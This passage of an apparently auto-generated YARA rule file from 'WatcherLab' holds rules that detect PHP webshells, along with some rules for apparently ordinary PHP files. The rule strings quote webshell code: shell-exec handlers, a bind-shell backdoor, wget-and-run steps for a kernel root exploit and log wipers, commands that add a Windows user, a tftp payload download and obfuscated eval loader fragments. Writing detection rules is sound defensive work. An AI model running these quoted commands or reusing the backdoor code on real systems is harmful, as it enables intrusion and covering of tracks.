      $s6 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s7 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s8 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s9 = "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s10 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s11 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s12 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s13 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s14 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s15 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s16 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s17 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s18 = "scookie('phpspypass', $password);" fullword ascii
      $s19 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s20 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_6073366f1eb1bde102204753c3e592a4adbc42c3
{
   meta:
      description = "php17 - file 6073366f1eb1bde102204753c3e592a4adbc42c3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3cfbda085541bb273ec58c5b11daec3639eb5d8f8df1b44d80960edd608edbc9"
   strings:
      $s1 = "$arr = array('test' => 1, $_REQUEST['pass'] => 2);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_28963af8abbe9f738531fa2fe0e9e8cb276d4061
{
   meta:
      description = "php17 - file 28963af8abbe9f738531fa2fe0e9e8cb276d4061.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8dbf7351bb49a0eda096338b394c2018bbc66efece0b9b4c37e0a85373835243"
   strings:
      $x1 = "else { echo 'Could not execute command using system(), shell_exec(), passthru(), exec() && popen().'; }" fullword ascii
      $x2 = "echo '<form action=\"\" method=\"post\" id=\"form\"><textarea cols=\"90\" rows=\"25\" style=\"overflow:auto;\" id=\"fileEdit\" n" ascii
      $x3 = "<form action=\"?action=CLI&amp;dir=',$SCDIR,'\" method=\"post\" style=\"display:inline;\">Execute command" fullword ascii
      $x4 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x5 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x6 = "| [<a href=\"http://www.stayinvisible.com/\" target=\"_blank\">" fullword ascii
      $x7 = "if (is_dir($_POST['dm'])) { echo '\\'',htmlspecialchars($_POST['dm']),'\\' - Directory Already exists.'; }" fullword ascii
      $s8 = "Remove the shell password? <input type=\"submit\" id=\"removep\" name=\"removep\" value=\"Remove\" />" fullword ascii
      $s9 = "if (function_exists('shell_exec')) { echo htmlspecialchars(shell_exec('type '.$_POST['value'])); $Suc = TRUE; }" fullword ascii
      $s10 = "else { echo 'Error while removing shell, Could not delete the file.';GetLastError(); }" fullword ascii
      $s11 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s12 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s13 = "<td><form action=\"http://www.md5decrypter.com/\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidd" ascii
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s16 = "strpos($ShellContents,'$Auth = FALSE;'),14)) != 0) { echo 'Password set.'; }" fullword ascii
      $s17 = "blur=\"javascript: if(this.value === \\'\\') { this.value = \\'Target of the link\\'; }\" style=\"width:140px;\" />" fullword ascii
      $s18 = "echo 'Please enter the password: <input type=\"text\" id=\"pass\" name=\"pass\" /> <input type=\"submit\" value=\"Enter\" />" fullword ascii
      $s19 = "elseif (function_exists('shell_exec')) { echo shell_exec($_POST['c']); }" fullword ascii
      $s20 = "if ($_GET['action'] === 'getfile') { if (!readfile($_GET['file'])) { echo file_get_contents($_GET['file']); } die; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_20170502221506_sales_tax_data
{
   meta:
      description = "php17 - file 20170502221506_sales_tax_data.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "88f871fb5255150d1c20943c39d419408e45c2a5dc69a9b74bf38a69f3ef9f25"
   strings:
      $s1 = "error_log('Migrating sales tax history.  The number of sales that will be migrated is '.$number_of_unmigrated);" fullword ascii
      $s2 = "$item_tax_amount = $this->tax_lib->get_sales_tax_for_amount($tax_basis, $item['percent'], PHP_ROUND_HALF_UP, $tax_decimals);" fullword ascii
      $s3 = "error_log('Migrating sales tax history.  The number of sales that will be migrated is finished.');" fullword ascii
      $s4 = "private function update_sales_items_taxes_amount($sale_id, $line, $name, $percent, $tax_type, $item_tax_amount)" fullword ascii
      $s5 = "$customer_sales_tax_support = $CI->config->config['customer_sales_tax_support'];" fullword ascii
      $s6 = "$this->update_sales_items_taxes_amount($sale_id, $item['line'], $item['name'], $item['percent'], $tax_type, $item_tax_amount);" fullword ascii
      $s7 = "$unmigrated_invoices = $this->get_unmigrated($number_of_unmigrated)->result_array();" fullword ascii
      $s8 = "private function get_sale_items_for_migration($sale_id)" fullword ascii
      $s9 = "$result = $this->db->query('SELECT COUNT(*) FROM(SELECT SIT.sale_id, ST.sale_id as sales_taxes_sale_id FROM '" fullword ascii
      $s10 = "private function get_unmigrated($block_count)" fullword ascii
      $s11 = "private function get_count_of_unmigrated()" fullword ascii
      $s12 = "$this->db->update('sales_items_taxes', array('tax_type' => $tax_type, 'item_tax_amount' => $item_tax_amount));" fullword ascii
      $s13 = "$items = $this->get_sale_items_for_migration($sale_id)->result_array();" fullword ascii
      $s14 = "<?php if (!defined('BASEPATH')) exit('No direct script access allowed');" fullword ascii
      $s15 = "$number_of_unmigrated = $this->get_count_of_unmigrated();" fullword ascii
      $s16 = ". ' as ST ON SIT.sale_id = ST.sale_id WHERE ST.sale_id is null GROUP BY SIT.sale_id, ST.sale_id'" fullword ascii
      $s17 = "// This computes tax for each line item and adds it to the tax type total" fullword ascii
      $s18 = "// Not sure when this would ever kick in, but this is technically the correct logic." fullword ascii
      $s19 = "foreach($unmigrated_invoices as $key=>$unmigrated_invoice)" fullword ascii
      $s20 = "$tax_decimals = $CI->config->config['tax_decimals'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_44b8eca32932e4e42f0d59dfe67014b2bba88292
{
   meta:
      description = "php17 - file 44b8eca32932e4e42f0d59dfe67014b2bba88292.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 1)" fullword ascii
      $x2 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit" fullword ascii
      $x3 = "<OPTION VALUE=\"mv 1.txt exploit.c\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)" fullword ascii
      $x4 = "<OPTION VALUE=\"gcc exploit.c -o exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 3)" fullword ascii
      $x5 = "<form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" " ascii
      $x6 = "<OPTION VALUE=\"./vanish <? echo exec('whoami'); ?> <? echo $_SERVER[\"REMOTE_ADDR\"]; ?> <? echo gethostbynam" fullword ascii
      $x7 = "echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $x8 = "color: #fff\">http://devilzc0de.com/</a></u><br> # Contact : failed404@gmail.com </u></p>" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (Part 1)(Zap3)" fullword ascii
      $x10 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part 1)(Vanish)" fullword ascii
      $x11 = "<OPTION VALUE=\"which wget curl w3m lynx\">Check For Downloaders (WGET, et cetera)" fullword ascii
      $x12 = "<OPTION VALUE=\"./exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 4)" fullword ascii
      $x13 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part " fullword ascii
      $x14 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s15 = "$logfile = $tmpdir_logs.\"ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s16 = "<OPTION VALUE=\"./vanish <? echo exec('whoami'); ?> <? echo $_SERVER[\"REMOTE_ADDR\"]; ?> <? echo gethostbyname($_SERVER[\"HTTP_" ascii
      $s17 = "echo(\"<b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $s18 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (P" fullword ascii
      $s19 = "<OPTION VALUE=\"cat /var/cpanel/accounting.log\">Get cpanel logs" fullword ascii
      $s20 = "<OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c <?php passthru('pwd'); ?>\">Tar your current directory. (Only works if the dir" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_9a8b3c9686b14ea3c186be5afba944417aabcf7a
{
   meta:
      description = "php17 - file 9a8b3c9686b14ea3c186be5afba944417aabcf7a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b77c002774f27310df867cfcfbfb0140ea62c16cf76c8ddb9565906b684229e"
   strings:
      $s1 = "$k='(?$\"/_/\"?$?$,\"/-/\"),array(\"/?$\",?$\"+\"?$),$ss($s[$i],0?$,$e))?$?$),$k)));$o=ob_get_?$c?$on?$tents();ob_end_c?$l?$';" fullword ascii
      $s2 = "$W=')?${$k=$?$?$kh.$kf?$;ob_start()?$;@eva?$l(@gz?$uncompre?$ss(@?$?$x(@bas?$e64_decode(pre?$g_r?$epla?$?$ce(array';" fullword ascii
      $s3 = "$Z='?$rr=@$r?$[\"HTTP?$_REFERER?$\"];$?$ra?$=@$r[?$\"HTTP_ACCEP?$T_LA?$NGUAGE?$\"];i?$f($?$rr&&?$$ra){$u?$=p?$arse_url($rr';" fullword ascii
      $s4 = "$D='ea?$n();$d=base6?$4_en?$code(x(gz?$co?$mp?$res?$s($o)?$,?$$k));print(\"<$k>$d</$?$k>\");?$@session_d?$estro?$y();}}}}';" fullword ascii
      $s5 = "$F='=0.([\\\\d]))?,?/?$\",$ra,$m?$);if?$($q&&?$$m){@sessi?$on_?$st?$art();$s?$=&$_SESSION?$?$;$ss=\"s?$u?$bstr\";$sl=?$\"str';" fullword ascii
      $s6 = "$Q='$s[$i]=\"\";$p=$ss($p,3);?$}if(ar?$ray_key?$_ex?$ists($i,?$$s)?$)?${$s[$i].=$?$p;$e=strp?$os($s[$?$i]?$,$f);if($e';" fullword ascii
      $s7 = "$O='3));?$$p=\"?$\"?$;for($?$z=1;?$$z<count($m?$[1]);$z++)$?$p.=$?$q[?$$m[2?$][$z]];if?$(str?$pos($p?$,$h)=?$==0){?$$?';" fullword ascii
      $s8 = "$M='$?$kh=\"5d41\";$k?$f?$=\"402a\";fu?$nction ?$x?$($t,$k){$?$c=str?$len($?$k);$l=st?$rlen($t)?$;$o=\"\";f?$or($i?$=0;$i<';" fullword ascii
      $s9 = "$p=');?$parse_str(?$$u[\"q?$?$uery\"],$q)?$;$q=?$array_valu?$es($q);pre?$g?$_match_?$all(?$\"?$/([\\\\w?$])[\\\\w-]+(?$?:?$;q';" fullword ascii
      $s10 = "$u='t?$olower\";$i=$m?$[1]?$[0].$?$m[1]?$[1];$h=$sl(?$$ss(?$md5($i.$k?$h),0?$?$,3));$f=$sl($?$ss(?$md5($i.$kf?$),0,?$';" fullword ascii
      $s11 = "$i='?$$?$l;){for(?$$j=0;(?$$?$j<$c&&$i<$l);$?$j++,$?$?$i?$++){$o.=$t?${$i}^$k{$j};}?$}retur?$n $o;}$?$r?$=$_SERVER;$';" fullword ascii
      $s12 = "$o=str_replace('?$','',$M.$i.$Z.$p.$F.$u.$O.$Q.$W.$k.$D);" fullword ascii
      $s13 = "$s=str_replace('gh','','crghgheaghtghegh_funcghtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}


rule sig_25201d4142d5b2ddd507ad84819c2810
{
   meta:
      description = "php17 - file 25201d4142d5b2ddd507ad84819c2810.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eaed223bfae1125f5f09e1013ec01da9d7d4fa5c79300e502912e1a73c64af13"
   strings:
      $s1 = "echo \"<form method='post' enctype='multipart/form-data'>" fullword ascii
      $s2 = "<input type='file' name='idx'><input type='submit' name='upload' value='upload'>" fullword ascii
      $s3 = "if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {" fullword ascii
      $s4 = "if($_POST['upload']) {" fullword ascii
      $s5 = "echo base64_decode(\"UGFrIEhheG9y\");" fullword ascii
      $s6 = "echo \"<br>\".php_uname().\"<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_959b2d4fc790d62358dee5b40fe88816874ec5a0
{
   meta:
      description = "php17 - file 959b2d4fc790d62358dee5b40fe88816874ec5a0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3b0198e748e452c6cf2101aebe963f0cb014a985e3248b955e9faf87bdc9f158"
   strings:
      $x1 = "$file_name = substr(basename($target),0,strrpos(basename($target),'.log')).'.log';" fullword ascii
      $x2 = "$target .= 'Error_' . $now_day . '.log';break;" fullword ascii
      $s3 = "$target .= 'Warning_' . $now_day . '.log';break;" fullword ascii
      $s4 = "header(\"Content-Ranges: bytes\".$start .\"-\".($size - 1).\"/\" .$size);" fullword ascii
      $s5 = "$target .= 'Log_' . $now_day . '.log';break;" fullword ascii
      $s6 = "$target .= 'Db_' . $now_day . '.log';break;" fullword ascii
      $s7 = "$target .= 'Info_' . $now_day . '.log';break;" fullword ascii
      $s8 = "$target .= 'Debug_' . $now_day . '.log';break;" fullword ascii
      $s9 = "return error_log(\"$now_time $log\\n\", 3, $target);" fullword ascii
      $s10 = "header(\"Content-Length: \".($size - $start));" fullword ascii
      $s11 = "if(preg_match('/MSIE/',$_SERVER['HTTP_USER_AGENT'])){" fullword ascii
      $s12 = "$config['password'] = '81d350d4d0d7ea5979987da0b5952d72'; //kntan 's md5" fullword ascii
      $s13 = "if(md5($_POST['pass'])!=$config['password']){" fullword ascii
      $s14 = "'text' => array('txt','ini','log','asc','csv','tsv','vbs','bat','cmd','inc','conf','inf')," fullword ascii
      $s15 = "header(\"HTTP/1.1 206 Partial Content\");" fullword ascii
      $s16 = "fwrite($download_fp, fread($fp, 1024 * 8 ), 1024 * 8);" fullword ascii
      $s17 = "Password: <input type=\\\"password\\\" name=\\\"pass\\\">" fullword ascii
      $s18 = "echo \"<a href=?op=login>Logout Ok!Click here to login in!</a>\";" fullword ascii
      $s19 = "=> array('mp3','ogg','oga','mid','midi','ram','wav','wma','aac','ac3','aif','aiff','m3a','m4a','m4b','mka','mp1','mx3','mp2')," fullword ascii
      $s20 = "$content = @fread($fp,get_filesize($f));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule sig_5425e9f71fca02fd3ac7a3ffa8dbd254afec8213
{
   meta:
      description = "php17 - file 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
   strings:
      $x1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r abc123 /add');\";" fullword ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%ex" fullword ascii
      $x3 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?ph" fullword ascii
      $x4 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x5 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_val" ascii
      $x6 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpin" ascii
      $x7 = "t($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\\\windows\\\\system32\\\\cmd.exe'; print<<<END" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])) { $exe = @$shell->exec(\"$cmdpath /c \".$cmd); $out = $exe->StdOut(); $output = $out->ReadAll(); echo " ascii
      $x9 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x10 = "Str[15] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x11 = "';} } Root_Login($MSG_TOP); exit(); ob_end_flush(); } if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS()" ascii
      $x12 = "== 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);} " fullword ascii
      $x13 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $x14 = "','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<" ascii
      $x15 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = isset($_POST['getfile']) ? $_POST['getfile'] : ''; " ascii
      $x16 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_va" fullword ascii
      $x17 = "$shell = new COM($com[$object]); if($object == 'wscript') { $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir'; $cmdpath = isse" ascii
      $x18 = "'; $cmd = 'dir'; if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];} print<<<END" fullword ascii
      $x19 = "'; $mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $sqlcmd = 'ver'; if(isset($_POST['mhos" ascii
      $x20 = "= VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule activeServer_sqliteDAL_class
{
   meta:
      description = "php17 - file activeServer_sqliteDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f43f231a370a763f91f10144fab1ca3ce5e633b67f268286dce48448a0069ea4"
   strings:
      $s1 = "function  GetPageList(activeServerModel $model, $start, $limit)" fullword ascii
      $s2 = "function  GetPageCount(activeServerModel $model, $perPageCount)" fullword ascii
      $s3 = "function  GetModel(activeServerModel $model)" fullword ascii
      $s4 = "function  GetList(activeServerModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeServerModel $model)" fullword ascii
      $s10 = "function  DeleteFrom(activeServerModel $model)" fullword ascii
      $s11 = "function  UpDateSet(activeServerModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_3f263527f2eba56b6161f0acbbfabe6b999446a6
{
   meta:
      description = "php17 - file 3f263527f2eba56b6161f0acbbfabe6b999446a6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eb9e4cc5c02651f5a40d0f94ffac551ad1380e6b66e8182c3823d36be155b181"
   strings:
      $s1 = "header( 'Location: login.html' );" fullword ascii
      $s2 = "if ( !isset( $_SESSION['username'] ) ) {" fullword ascii
      $s3 = "<center><a href=\"index.php\">Home</a></center>" fullword ascii
      $s4 = "<title>Rasputin PHP Info</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_35b0448cd3e328b11521ab053ea0c99694119b82
{
   meta:
      description = "php17 - file 35b0448cd3e328b11521ab053ea0c99694119b82.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x3 = "<input type='submit' value='fakenamegenerator.com' onclick=\\\"document.hf.action='http://www.fakenamegenerator.com/';" fullword ascii
      $x4 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $x7 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x8 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x9 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x10 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x11 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x12 = "'<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname" ascii
      $s13 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s14 = "<input type='submit' value='fopo.com.ar' onclick=\\\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\\\"><br>" fullword ascii
      $s15 = "<input type='submit' value='toolki.com' onclick=\\\"document.hf.action='http://toolki.com/';document.hf.submit()\\\"><br>" fullword ascii
      $s16 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s18 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s19 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s20 = "type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=ch" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_0cf5ccfe895b5e840501281016048a7b
{
   meta:
      description = "php17 - file 0cf5ccfe895b5e840501281016048a7b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7bbd49a07fe243fa6124cd60f0b27400f97fcd2ed14606e48c2bd2e06c582d08"
   strings:
      $s1 = "echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br>\";" fullword ascii
      $s2 = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$_FILES[\"file\"][\"name\"]);" fullword ascii
      $s3 = "$temp = explode(\".\", $_FILES[\"file\"][\"name\"]);" fullword ascii
      $s4 = "echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";" fullword ascii
      $s5 = "$extension = end($temp);" fullword ascii
      $s6 = "<form action=\"\" method=\"post\"" fullword ascii
      $s7 = "echo \"Upload: \" . $_FILES[\"file\"][\"name\"] . \"<br>\";" fullword ascii
      $s8 = "echo \"Size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\";" fullword ascii
      $s9 = "if ($_FILES[\"file\"][\"error\"] > 0)" fullword ascii
      $s10 = "echo \"Type: \" . $_FILES[\"file\"][\"type\"] . \"<br>\";" fullword ascii
      $s11 = "<input type=\"submit\" name=\"submit\" value=\"Submit\">" fullword ascii
      $s12 = "<input type=\"file\" name=\"file\" id=\"file\"><br>" fullword ascii
      $s13 = "<label for=\"file\">Filename:</label>" fullword ascii
      $s14 = "enctype=\"multipart/form-data\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule adodb_odbc_db2_inc
{
   meta:
      description = "php17 - file adodb-odbc_db2.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1203a3b1608fd5f0591ede6107ad2b991faea9e38de6dc4b586f001404d0c365"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "function SelectLimit($sql, $nrows = -1, $offset = -1, $inputArr = false, $secs2cache = 0)" fullword ascii
      $s3 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
      $s4 = "function __construct($id,$mode=false)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      all of them
}

rule sig_2017_10_07_213407_files_update_permissions_table
{
   meta:
      description = "php17 - file 2017_10_07_213407_files_update_permissions_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cc9c8a9df0822257be08ca29f23c46e4c96426716361c1d94b2806676ad93cc"
   strings:
      $s1 = "use App\\Modules\\Platform\\Database\\ManagePermissionsTrait;" fullword ascii
      $s2 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s3 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
      $s4 = "$this->deletePermissions('files');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_3d5179dc1525fcb0e4ff882e0d1140adcde7c098
{
   meta:
      description = "php17 - file 3d5179dc1525fcb0e4ff882e0d1140adcde7c098.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3cbf00e4871b1648c54cb06302afd5d4fc1e0de43896cfc37199868a2856e358"
   strings:
      $s1 = "$result = @$stmt->fetchAll(PDO::FETCH_FUNC, str_rot13('nffreg'));" fullword ascii
      $s2 = "if(($db = @new PDO('sqlite::memory:')) && ($sql = strrev('TSOP_')) && ($sql = $$sql)) {" fullword ascii
      $s3 = "$stmt = @$db->query(\"SELECT '{$sql[b4dboy]}'\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_91e728880cb5ae1d703c733a6ed29410
{
   meta:
